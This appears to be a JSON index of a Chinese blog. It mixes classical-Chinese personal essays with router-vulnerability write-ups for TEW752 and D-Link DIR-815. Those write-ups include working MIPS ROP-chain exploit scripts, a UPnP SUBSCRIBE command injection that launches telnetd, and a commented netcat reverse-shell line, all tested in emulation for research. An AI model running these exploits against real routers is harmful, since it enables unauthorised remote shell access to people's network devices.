0x3ff38000\n所以vmmap查看得到的，\u0026lt; explored \u0026gt;文件就是libc的基址\n3 找gadget\r考虑利用system函数来得到shell\n1 mipsrop.stackfinder() 选择0x16824处的gadget\n$sp + 0x10传给$s5，在0x16838处又赋值给$a0，$a0作为函数传参的寄存器，要存放cmd\n跳转$s0。\n仍然需要防止坏字符00，所以找对$s0操作的gadget\n观察溢出函数处\n1 mipsrop.find(\u0026#34;addiu $s0\u0026#34;) $s1放上一个gadget\n$0 放system地址\n$ra 返回地址放第二个gadget\n本地利用\r根据测得的偏移和找到的基址以及gadget，编写exp如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # python3 from pwn import * context.endian = \u0026#34;little\u0026#34; context.arch = \u0026#34;mips\u0026#34; base_addr = 0x3ff38000 system_addr_1 = 0x53200-1 gadget1 = 0x16824 gadget2 = 0x32a98 padding = b\u0026#39;A\u0026#39; * 0x1ce padding += p32(base_addr + system_addr_1) # s0 padding += p32(base_addr + gadget1 ) # s1 padding +=b\u0026#39;a\u0026#39;*4 # s2 padding += p32(base_addr + gadget2) # ra padding += b\u0026#39;B\u0026#39; * 0x10 padding += b\u0026#39;/bin//sh\u0026#39; f = open(\u0026#34;exploit\u0026#34;,\u0026#39;wb+\u0026#39;) f.write(padding) f.close() 用start.sh脚本启动模拟，gdb连接上之后不用下断点，直接c，成功得到shell\n模拟环境利用\r首先使用固件模拟工具FirmAE进行固件的模拟\n然后直接运行以下exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import socket import os from time import sleep server = \u0026#39;192.168.10.1\u0026#39; port = 49152 shell = \u0026#39;`telnetd -p 8888 \u0026amp;`\u0026#39; con = socket.socket(socket.AF_INET, socket.SOCK_STREAM) request = \u0026#34;SUBSCRIBE /gena.cgi?service=\u0026#34; + str(shell) + \u0026#34; HTTP/1.0\\n\u0026#34; request += \u0026#34;Host: \u0026#34; + str(server) + str(port) + \u0026#34;\\n\u0026#34; request += \u0026#34;Callback: \u0026lt;http://192.168.0.4:34033/ServiceProxy27\u0026gt;\\n\u0026#34; request += \u0026#34;NT: upnp:event\\n\u0026#34; request += \u0026#34;Timeout: Second-1800\\n\u0026#34; request += \u0026#34;Accept-Encoding: gzip, deflate\\n\u0026#34; request += \u0026#34;User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\\n\\n\u0026#34; sleep(1) con.connect((socket.gethostbyname(server),port)) con.send(request.encode()) results = con.recv(4096) sleep(3) print(\u0026#34;sucess\u0026#34;) os.system(\u0026#39;telnet \u0026#39; + str(server) + \u0026#39; 8888\u0026#39;) 可以成功获得shell\n","date":"2024-09-04T16:42:46+08:00","permalink":"https://zhu1ang.github.io/p/tew752/","title":"TEW752"},{"content":"​ 初，余年十三学于鲁南。其地僻物薄，学子之数不可数也，诸君皆寒窗熬烛无敢懈者。彼时诸学子岁未及束发而负千钧之重，日日惶恐，时时叹息，唯恐力不尽心而有所辜负万一。又，余家贫无可供玩乐消遣者，困顿之意无从消处，唯武侠小说数本可略自娱。\n​ 当是时，偶读《多情剑客无情剑》便深叹服，迷恋不能自已，从此真如“一入江湖深似海”。三年之间，古龙先生数十作品皆一一拜读，然意犹未尽，故又日夜捧读金庸先生之作，更是别有一番滋味。江湖豪情，儿女情长，甚合余少年心境，每每念及，必心驰神往。\n​ 而后，三年之期以备高考之事至。平素课业压力之大，犹如枯木支撑泰山、土堤拦断江河，倾塌崩溃只在一瞬之间。其压迫之感，呼吸尚不能遑论自娱哉？于是诸侠义小说皆不得已搁置，恍恍惚三年，身处其中不觉岁月之快只觉年岁之苦，霎时间三年往事烟消云散方如梦初醒，故人离别、旧事尘封，再回首已是物是人非。\n​ 又数年，余历经人生之起落，就中苦乐曲折实非片语只字可叙一二，唯叹情之一事，无可奈何。当时心境无一丝少年侠气，是为飘渺虚妄年岁，思量到处，不敢回首，不甘回首。\n​ 而今忽有一剧名为《金庸武侠世界》，略观之，少年旧事忽如春风过水，万层涟漪攒入心头，于是重拾武侠小说，再品江湖风流。\n","date":"2024-09-04T16:41:33+08:00","permalink":"https://zhu1ang.github.io/p/%E6%B1%9F%E6%B9%96%E6%9D%82%E8%B0%88/","title":"江湖杂谈"},{"content":"1 环境准备\r固件下载链接：DLink下载\n物理机：Ubuntu 20.04 （需安装binwalk、qemu、pwntools等）\n反汇编共工具：IDA Pro\n2 静态分析\r根据已有的资料，DIR-815多重栈溢出漏洞和前端的超长cookie有关，并且漏洞文件为 hedweb.cgi\n首先对固件进行解包\n1 binwalk -Me xxx.bin 找到漏洞文件路径：/htdocs/web/hedwig.cgi\n是/htdocs/cgibin的软链接，因此，使用IDA逆向分析cgibin\n在main函数中可以看到，此处为hedwigcgi_main函数分支\n另外根据cgi-bin的架构和常用的变量，若要操作cookie，需使用getenv(\u0026quot;HTTP_COOKIE\u0026quot;)\n直接搜索\u0026quot;HTTP_COOKIE\u0026quot;字符串，根据交叉引用，只有sess_get_uid这个函数使用了这 个字符串\n继续通过交叉引用回溯，发现在hedwigcgi_main调用了这个函数\n并且两次调用了sprintf这个危险函数，两次拼接使用的字符串都是sess_get_uid处理之后的v4，分析sess_get_uid函数可知，v4是COOKIE中的uid的值。\n如果能走到第二个sprintf函数，则会覆盖上一次拼接的内容，则第二处sprintf是溢出点\n两个判断需要满足的条件为：存在/var/tmp 目录以及环境变量REQUEST_URI不为空。\n由于固件解包后不存在/var/tmp目录，故需要自己创建，否则后续测试偏移时由于无法走到第二个sprintf函数会出错。\n3 动态调试\r3.1 qemu用户模式复现\r1 2 3 4 5 6 7 8 9 #!/bin/sh INPUT=\u0026#34;uid=1234\u0026#34; TEST=\u0026#34;uid=1234`cat payload`\u0026#34; LEN=$(echo -n \u0026#34;INPUT\u0026#34; |wc -c) PORT=\u0026#34;1234\u0026#34; cd ./squashfs-root cp $(which qemu-mipsel-static) ./qemu echo $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=\u0026#34;application/x-www-form-urlencoded\u0026#34; -E REQUEST_METHOD=\u0026#34;POST\u0026#34; -E HTTP_COOKIE=$TEST -E REQUEST_URI=\u0026#34;/hedwig.cgi\u0026#34; -g $PORT /htdocs/web/hedwig.cgi rm -f ./qemu 用以上脚本启动qemu模拟CGI程序，其中\ncyclic 2000生成2000字符作为payload -E 选项添加环境变量即HTTP_COOKIE等 使用以下命令启动\n1 2 3 4 sudo ./local.sh #启动调试脚本 gdb-multiarch ./squashfs-root/htdocs/cgibin #多架构gdb调试 target remote 127.0.0.1:1234 b *ret_addr #在hedwigcgi_main函数返回处下断点 可以看到返回地址$ra已经被覆盖了\n测得偏移为1009\n接下来就是获取基地址：\nvmmap命令查看，很大概率会因为gdb版本问题导致命令执行无效 libc函数地址 - 偏移 = 基地址，延迟绑定特性、write、puts泄露等 读取程序的 /proc/self/maps来获取与程序相关的基地址 第一个LOAD段中包含了共享库的代码段，其权限为r-xp，因此可以使用 ret2call，去调用system函数因此需要获取基地址\n通过延迟绑定机制计算基地址：\n基地址 = 0x7f76ca20 - 0x34a20 = 0x7f738000\n接下来的工作就是构造ROP链\n一般的x86的栈溢出可以直接覆盖返回地址与参数，但是MIPS的前四个参数是通过寄存器传递的，故不能直接覆盖栈来实现诸如system('cmd')的执行。\nMIPS架构栈溢出特性：\n1分支延迟，例如跳转指令在跳转地址填充后，跳转之前，会先执行跳转指令的下一条指令 2缓存不一致，指令缓存区（Instruction Cache）和数据缓存区（Data Cache）两者的同步需要时间，即栈上写入的指令并不是立即可以执行的 注意：system的地址为0x0053200，结尾是\u0026rsquo;x00/\u0026rsquo;，在sprintf函数拼接payload过程中会被截断，故此处考虑写入 system_addr - 1，再使用addiu \u0026hellip; , 1 的gadget还原后再跳转\n通过IDA的mipsrop插件执行mipsrop.stackfinder(),找到0x159cc的gadget，这个gadget的作用是跳转$s0，并把$s5的值赋给$a0，也就是第一个参数寄存器。\n通过mipsrop.find(\u0026quot;addiu $s0 , 1\u0026quot;)找到第二个还原system_addr的gadget\n根据函数结束处的栈布局以及两个gadget进行ROP链的组装，得到exp如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from pwn import * context.arch = \u0026#39;mips\u0026#39; context.endian = \u0026#39;little\u0026#39; libc_base = 0x7F738000 system_offset = 0x53200-1 gadget1 = 0x159cc gadget2 = 0x158C8 #cmd = b\u0026#34;nc -e /bin/bash 9999\u0026#34; cmd = b\u0026#34;/bin/sh\u0026#34; data = b\u0026#34;a\u0026#34;*(1009 - 36) data += p32(libc_base+system_offset) #s0 data += b\u0026#34;bbbb\u0026#34; #s1 data += b\u0026#34;cccc\u0026#34; #s2 data += b\u0026#34;dddd\u0026#34; #s3 data += b\u0026#34;eeee\u0026#34; #s4 data += p32(libc_base+gadget1) #s5 # addiu $s5, $sp, 0x10 # move $a1, $s3 # move $a2, $s1 # move $t9, $s0 # jalr $t9 # move $a0, $s5 data += b\u0026#34;ffff\u0026#34; #s6 data += b\u0026#34;gggg\u0026#34; #s7 data += b\u0026#34;aaaa\u0026#34; #fp data += p32(libc_base+gadget2) #ra # move $t9, $s5 # jalr $t9 # addiu $s0, 1 data += b\u0026#34;b\u0026#34;*0x10 data += cmd f=open(\u0026#34;payload\u0026#34;,\u0026#34;wb\u0026#34;) f.write(data) f.close() 调试过程可以看出ROP链的构造没有问题，但是用户模式却无法打通，参考网上博客是这里system函数中有调用fork()函数，而用户模式是不支持多线程的，这里fork()的失败，会导致后面$fp是个空指针，就会出错。\n故此处应使用ROP+shellcode方法\nexp：\n3.2 qemu系统模式复现\r用户模式（User Mode）： 用户模式通常指的是在操作系统的用户空间下运行的程序或进程。在这种模式下，QEMU 可以模拟一个用户级别的环境，但不会涉及到底层的硬件操作或系统调用。 在用户模式下，程序的运行受到操作系统的隔离和限制，无法直接访问硬件设备或执行系统级操作。 系统模式（System Mode）： 系统模式，也称为\u0026quot;全系统仿真\u0026quot;（Full System Emulation），指的是 QEMU 模拟整个计算机系统，包括 CPU、内存、硬盘、网络设备等硬件组件。 在这种模式下，QEMU 可以运行完整的操作系统镜像，允许用户像在真实硬件上一样启动和使用操作系统。 系统模式提供了更接近真实环境的测试和开发平台，适用于操作系统开发、硬件兼容性测试、安全研究等场景。 两者的主要区别在于仿真的范围和深度：\n用户模式更侧重于应用程序层面的仿真，适用于开发和测试应用程序。 系统模式提供了更全面的仿真环境，包括硬件和操作系统层面，适用于底层开发和系统级测试。 3.2.1 配置qemu网络设置\r首先需要下载qemu虚拟机镜像文件：[qemu mips](Index of /~aurel32/qemu (debian.org))\n然后使用启动脚本启动qemu虚拟机，并配置网络\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #! /bin/sh echo \u0026#34;config net\u0026#34; # 1 # 这两句不能断开 brctl addbr br0 #ifconfig br0 up # or ip link set br0 up # 2 brctl addif br0 ens33 #ifconfig ens33 0.0.0.0 # or ip addr add 0.0.0.0 dev ens33 # 3 dhclient br0 # 4 tunctl -t tap0 -u `whoami` #ifconfig tap0 up # or ip link set tap0 up brctl addif br0 tap0 # 5 echo \u0026#34;qemu start \u0026#34; sudo qemu-system-mipsel -M malta -kernel ./vmlinux-3.2.0-4-4kc-malta -hda ./debian_squeeze_mipsel_standard.qcow2 -append \u0026#34;root=/dev/sda1 console=tty0\u0026#34; -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic 等待启动完成，qemu的默认登录为：root/root，登录后使用ifconfig查看网卡信息——如果此时eth0网卡存在但没有IP，可以使用ifconfig eth0 ip/24 up手动分配ip，注意要和宿主机在同一网卡下。\n互相测试能否ping通\n3.2.2 上传固件\r需要在qemu虚拟机使用chroot切换根目录，并执行shell，因此需要将物理机中解压出来的文件系统上传到qemu虚拟机中。\n1 scp -r squashfs-root/ root@qemu_IP:/path/ 3.2.3开启httpd服务\r在qemu虚拟机的squashfs-root目录下新建一个http_conf配置文件，里面写入（注意修改49行的ip）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 Umask 026 PIDFile /var/run/httpd.pid LogGMT On #开启log ErrorLog /log #log文件 Tuning { NumConnections 15 BufSize 12288 InputBufSize 4096 ScriptBufSize 4096 NumHeaders 100 Timeout 60 ScriptTimeout 60 } Control { Types { text/html { html htm } text/xml { xml } text/plain { txt } image/gif { gif } image/jpeg { jpg } text/css { css } application/octet-stream { * } } Specials { Dump { /dump } CGI { cgi } Imagemap { map } Redirect { url } } External { /usr/sbin/phpcgi { php } } } Server { ServerName \u0026#34;Linux, HTTP/1.1, \u0026#34; ServerId \u0026#34;1234\u0026#34; Family inet Interface eth0 #对应qemu仿真路由器系统的网卡 Address 192.168.182.6 #qemu仿真路由器系统的IP Port \u0026#34;1234\u0026#34; #对应未被使用的端口 Virtual { AnyHost Control { Alias / Location /htdocs/web IndexNames { index.php } External { /usr/sbin/phpcgi { router_info.xml } /usr/sbin/phpcgi { post_login.xml } } } Control { Alias /HNAP1 Location /htdocs/HNAP1 External { /usr/sbin/hnap { hnap } } IndexNames { index.hnap } } } } 3.2.4开启物理机转发功能\r在宿主机中新建以下net_conf_host.sh脚本并执行：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #! /bin/sh sudo sysctl -w net.ipv4.ip_forward=1 sudo iptables -F sudo iptables -X sudo iptables -t nat -F sudo iptables -t nat -X sudo iptables -t mangle -F sudo iptables -t mangle -X sudo iptables -P INPUT ACCEPT sudo iptables -P FORWARD ACCEPT sudo iptables -P OUTPUT ACCEPT sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT 之后，再在qemu虚拟机的squashfs-root目录下创建init.sh的脚本进行初始化操作：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #!/bin/bash echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space cp http_conf / cp sbin/httpd / cp -rf htdocs/ / mkdir /etc_bak cp -r /etc /etc_bak rm /etc/services cp -rf etc/ / cp lib/ld-uClibc-0.9.30.1.so /lib/ cp lib/libcrypt-0.9.30.1.so /lib/ cp lib/libc.so.0 /lib/ cp lib/libgcc_s.so.1 /lib/ cp lib/ld-uClibc.so.0 /lib/ cp lib/libcrypt.so.0 /lib/ cp lib/libgcc_s.so /lib/ cp lib/libuClibc-0.9.30.1.so /lib/ cd / rm -rf /htdocs/web/hedwig.cgi rm -rf /usr/sbin/phpcgi rm -rf /usr/sbin/hnap ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi ln -s /htdocs/cgibin /usr/sbin/phpcgi ln -s /htdocs/cgibin /usr/sbin/hnap ./httpd -f http_conf 通过以下命令切换根目录\n1 2 3 mount -o bind /dev ./squashfs-root/dev/ mount -t proc /proc/ ./squashfs-root/proc/ chroot squashfs-root bash 但是squashfs-root目录下并无bash，静态编译一个mips架构的bash放进去。\n如果报错没有PID文件，自己手动创建一个文件，只要PID不和已有的重复就行。\n最后，启动init.sh脚本，开启httpd服务\n此时在物理机中访问 qemu_IP/hedwig.cgi，如图：\n出现上图，则说明配置成功。最后，退出qemu虚拟机的时候，运行fin.sh的脚本恢复/etc文件夹,否则后续qemu会打不开：\n1 2 3 4 #!/bin/bash rm -rf /etc mv /etc_bak/etc /etc rm -rf /etc_bak 3.2.5 复现\r​ 在物理机上运行exp.py，将静态编译的gdbserver、生成的payload上传到qemu虚拟机中。\n注：系统模式和用户模式的基址可能是不同的\n执行以下脚本启动gdbserver调试\n1 2 3 4 5 6 7 8 9 10 11 export CONTENT_LENGTH=\u0026#34;100\u0026#34; export CONTENT_TYPE=\u0026#34;application/x-www-form-urlencoded\u0026#34; export HTTP_COOKIE=\u0026#34;uid=`cat payload`\u0026#34; export REQUEST_METHOD=\u0026#34;POST\u0026#34; export REQUEST_URI=\u0026#34;/hedwig.cgi\u0026#34; echo \u0026#34;uid=1234\u0026#34;|./gdbserver.mipsle 192.168.182.12:6666 /htdocs/web/hedwig.cgi #unset CONTENT_LENGTH #unset CONTENT_TYPE #unset HTTP_COOKIE #unset REQUEST_METHOD #unset REQUEST_URI 直接在虚拟机里启动该脚本，物理机启动一个端口监听，gdb连接上直接c即可获得shell\n附录\r参考文献\rhttps://bbs.kanxue.com/thread-272318.htm#msg_header_h3_8\nhttps://bbs.kanxue.com/thread-263758.htm\n","date":"2024-09-04T16:37:49+08:00","permalink":"https://zhu1ang.github.io/p/dir815/","title":"DIR815漏洞复现"},{"content":"​\t农历甲辰龙年七月初七，七夕，是为神仙眷侣期年相会之日，故民俗或借之以思旧、或以慕新。 余孑然一身，假期方尽，匆匆南下赴金陵求学。路途旅人数千，形形色色，皆疲于车马风尘，无暇他顾。 ​\t佳节美好良缘在众生亦不在众生。余与世间众旅人碍于路途遥遥心中烦闷，而无二意，是为不在众生。然，路远而终有尽头，彼时胡不可斟酒疏解心事、思恋佳人哉？或有人共度七夕者，则更效神仙事也。此是为在众生也。 ​\t凡世不仁亦当如此心境，可凌困苦而观前路光明者，方能不困于心不固于情。 感慨之余，余思衬毕竟七夕，不可枉费郎女会于鹊桥之美景也。于是余放胆祈求，月仙红线何时再缚余之心头？\n","date":"2024-09-04T16:33:50+08:00","permalink":"https://zhu1ang.github.io/p/%E4%B8%83%E5%A4%95%E9%9A%8F%E7%AC%94/","title":"七夕随笔"},{"content":"​\t余求学于金陵某学府，攻读硕士之业。吾自知才浅学疏，网安之事弗知一二，故无所求但期遇一明师指点一二使吾不致枉费十数年求学之功也。\n​\t然世事无常，人事多艰，吾虽再三思量却终身陷囹圄。吾所从之师，其形貌似人而所行之事比之狼豺野狗更甚。其平素不示以难，不指以困，反责吾等劳作之量甚微未及其预期也。更甚者，酬饷必延半载而后放，且斤斤计较、锱铢必较，师生之情全如商旅之事耳。暑假期间，犹命吾等加班不息，且督促倍加，以促进度。呜呼哀哉，是为吾与诸同窗之大不幸！\n​\t然余志在自强，冀望凭己绵薄之力，精一二之计术，辅日后之工作矣。此间所录，乃余学习之笔记，望能时时温故，悟新理，日新月异，以期小流积之成海、沙砾类之成山。顽石历经千磨虽不能成玉，然必有玉珏圆润清朗之光泽也。其中亦有吾之杂感随笔，权且聊以自娱，消磨闲暇，贻笑大方，深自惴惴。\n","date":"2024-09-04T16:14:47+08:00","permalink":"https://zhu1ang.github.io/p/%E8%87%AA%E9%93%AD%E5%BF%97/","title":"自铭志"}]